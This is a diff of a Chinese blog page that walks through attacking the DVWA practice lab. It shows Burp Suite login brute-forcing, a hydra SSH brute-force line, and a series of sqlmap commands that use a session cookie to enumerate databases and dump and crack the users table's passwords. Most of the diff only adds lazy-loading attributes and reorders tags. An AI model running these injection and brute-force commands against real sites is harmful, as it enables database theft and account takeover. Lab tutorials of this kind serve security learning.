@@ -165,46 +165,47 @@ hydra -L logins.txt -P pws.txt -M targets.txt ssh
 </ol>
 <p>说明可成本下载文件。。。</p>
 <h2 id="burt-suit-破解dvwa登陆"><a title="burt-suit 破解dvwa登陆" class="headerlink" href="#burt-suit-破解dvwa登陆"></a>burt-suit 破解dvwa登陆</h2><p>查看response返回值的location:,如果变成:index.php,	则表示成功</p>
-<h2 id="sqlmap注入攻击"><a title="sqlmap注入攻击" class="headerlink" href="#sqlmap注入攻击"></a>sqlmap注入攻击</h2><p><img alt="image.png" src="/images/1679558389450-cf870c4d-c147-48ca-9430-712e19061da0.png"></p>
+<h2 id="sqlmap注入攻击"><a title="sqlmap注入攻击" class="headerlink" href="#sqlmap注入攻击"></a>sqlmap注入攻击</h2><p><img loading="lazy" alt="image.png" src="/images/1679558389450-cf870c4d-c147-48ca-9430-712e19061da0.png"></p>
 <ol>
 <li>登陆dvwa靶场，找到注入点：</li>
 </ol>
 <p>1）找到sql注入项，输入1，提交查询<br>2）F12找到network,将此请求的cookie找到并复制出来</p>
 <ol start="3">
-<li><p>将复制的cooike格式改成这样：<br><img alt="image.png" src="/images/1679559846102-932d839a-6e60-4772-9aeb-72a11e0c4275.png"></p>
+<li><p>将复制的cooike格式改成这样：<br><img loading="lazy" alt="image.png" src="/images/1679559846102-932d839a-6e60-4772-9aeb-72a11e0c4275.png"></p>
 <p>4） 通过sqlmap命令注入测试</p>
 <pre><code> sqlmap -u "http://dvwa.com/vulnerabinities/sqli/i?id=1&amp;Submit#" --cookie "PHPSESSID=xxxx;security=low"
 </code></pre>
 </li>
 </ol>
-<p><img alt="image.png" src="/images/1679559636072-d39bb968-cdae-4df8-886f-be322968f631.png"></p>
+<p><img loading="lazy" alt="image.png" src="/images/1679559636072-d39bb968-cdae-4df8-886f-be322968f631.png"></p>
 <p>返回以下信息，代表已成功注入：</p>
-<p><img alt="image.png" src="/images/1679560309684-b18be56d-d22e-4b52-87aa-5f704f14c2f0.png"></p>
+<p><img loading="lazy" alt="image.png" src="/images/1679560309684-b18be56d-d22e-4b52-87aa-5f704f14c2f0.png"></p>
 <h3 id="遍历当前数据库实例所有数据库"><a title="遍历当前数据库实例所有数据库" class="headerlink" href="#遍历当前数据库实例所有数据库"></a>遍历当前数据库实例所有数据库</h3><pre><code>sqlmap -u "http://dvwa.com/vulnerabinities/sqli/i?id=1&amp;Submit#" --cookie 
 "PHPSESSID=xxxx;security=low" -dbs
 </code></pre>
 <p>返回5个数据库列表：</p>
-<p><img alt="image.png" src="/images/1679560808020-5a11b3fb-cdef-480b-9635-d12f03a4c63e.png"></p>
+<p><img loading="lazy" alt="image.png" src="/images/1679560808020-5a11b3fb-cdef-480b-9635-d12f03a4c63e.png"></p>
 <h3 id="查询当前用户使用的数据库"><a title="查询当前用户使用的数据库" class="headerlink" href="#查询当前用户使用的数据库"></a>查询当前用户使用的数据库</h3><pre><code>sqlmap -u "http://dvwa.com/vulnerabinities/sqli/i?id=1&amp;Submit#" --cookie 
 "PHPSESSID=xxxx;security=low" --current-db
 </code></pre>
-<p>获得当前数据库为dvwa：<br><img alt="image.png" src="/images/1679560721563-a26407d8-819e-4078-a81f-4b76ee81d629.png"></p>
+<p>获得当前数据库为dvwa：<br><img loading="lazy" alt="image.png" src="/images/1679560721563-a26407d8-819e-4078-a81f-4b76ee81d629.png"></p>
 <h3 id="查询dvwa数据库下所有的表"><a title="查询dvwa数据库下所有的表" class="headerlink" href="#查询dvwa数据库下所有的表"></a>查询dvwa数据库下所有的表</h3><pre><code>sqlmap -u "http://dvwa.com/vulnerabinities/sqli/i?id=1&amp;Submit#" --cookie 
 "PHPSESSID=xxxx;security=low" --tables -D dvwa
 </code></pre>
 <p>返回：</p>
-<p><img alt="image.png" src="/images/1679560969130-7c01d874-6da1-4a4b-a26e-7ae04c0bf0d3.png"></p>
+<p><img loading="lazy" alt="image.png" src="/images/1679560969130-7c01d874-6da1-4a4b-a26e-7ae04c0bf0d3.png"></p>
 <h3 id="查询用户表结构"><a title="查询用户表结构" class="headerlink" href="#查询用户表结构"></a>查询用户表结构</h3><p>查询users表中的列信息：</p>
-
-
+<pre><code>sqlmap -u "http://dvwa.com/vulnerabinities/sqli/i?id=1&amp;Submit#" --cookie 
+"PHPSESSID=xxxx;security=low" --column -T users -D dvwa
+</code></pre>
 <p>发现有8个列名：</p>
-<p><img alt="image.png" src="/images/1679561327621-e13db4ce-bc80-4f40-90bc-91b8882c32c3.png"></p>
+<p><img loading="lazy" alt="image.png" src="/images/1679561327621-e13db4ce-bc80-4f40-90bc-91b8882c32c3.png"></p>
 <h3 id="查询用户表内容"><a title="查询用户表内容" class="headerlink" href="#查询用户表内容"></a>查询用户表内容</h3><p>由于我只需要查用户名和密码，所以只需要查出这两个字段就行了：</p>
 <pre><code>sqlmap -u "http://dvwa.com/vulnerabinities/sqli/i?id=1&amp;Submit#" --cookie 
 "PHPSESSID=xxxx;security=low" --dump -T users -D dvwa -C "user,password"
 </code></pre>
 <p>输入之后，会提示你，要不要给你把密码破解，可能会有两三个提问，全部输入：Y，就会全部把密码给破解掉</p>
-<p><img alt="image.png" src="/images/1679561989988-19dd786f-ab80-40ca-bfe1-2d26f249a59a.png"></p>
+<p><img loading="lazy" alt="image.png" src="/images/1679561989988-19dd786f-ab80-40ca-bfe1-2d26f249a59a.png"></p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -529,11 +530,11 @@ hydra -L logins.txt -P pws.txt -M targets.txt ssh
 		  
 		
 		  
-			<li><a href="/categories/网络配置/" title="网络配置">网络配置<sup>2</sup></a></li>
+			<li><a href="/categories/系统-运维/网络配置/" title="网络配置">网络配置<sup>1</sup></a></li>
 		  
 		
 		  
-			<li><a href="/categories/系统-运维/网络配置/" title="网络配置">网络配置<sup>1</sup></a></li>
+			<li><a href="/categories/网络配置/" title="网络配置">网络配置<sup>2</sup></a></li>
 		  
 		
 		  
@@ -626,15 +627,15 @@ hydra -L logins.txt -P pws.txt -M targets.txt ssh
 			
 		
 			
+				<li><a href="/tags/路由器/" title="路由器">路由器<sup>3</sup></a></li>
+			
+		
+			
 				<li><a href="/tags/nexus/" title="nexus">nexus<sup>3</sup></a></li>
 			
 		
 			
 				<li><a href="/tags/ReactNative/" title="ReactNative">ReactNative<sup>3</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/路由器/" title="路由器">路由器<sup>3</sup></a></li>
 			
 		
 			
